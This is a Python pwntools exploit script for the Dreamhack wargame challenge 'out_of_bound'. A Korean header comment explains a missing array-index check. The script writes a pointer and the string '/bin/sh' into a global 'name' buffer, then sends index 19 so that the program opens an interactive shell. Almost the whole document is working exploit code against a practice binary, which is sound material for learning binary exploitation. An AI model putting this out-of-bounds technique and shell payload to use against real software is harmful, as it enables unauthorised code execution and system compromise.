'''
[Dreamhack] out_of_bound
1. 취약점: 배열 인덱스 검증이 없어 Out of Bound 취약점 발생
2. 시나리오: name 변수에 "/bin/sh"을 넣고 그 문자열이 위치한 주소를 넣은 뒤, 인덱스가 그곳을 가리키게 함
3. 페이로드 구조: 
    3-1. 첫 번째 페이로드: [name 변수 주소 + 0x4] + ["/bin/sh\x00" 문자열]
    3-2. 두 번째 페이로드: [name 변수 시작 위치를 가리키기 위한 인덱스]
'''

from pwn import *

# p = remote('IP', PORT)
p = process('./out_of_bound')
e = ELF('./out_of_bound')

name_addr = e.symbols['name']

payload = p32(name_addr + 0x4) + b'/bin/sh\x00'

p.sendlineafter(b': ', payload)

p.sendlineafter(b': ', b'19')

p.interactive()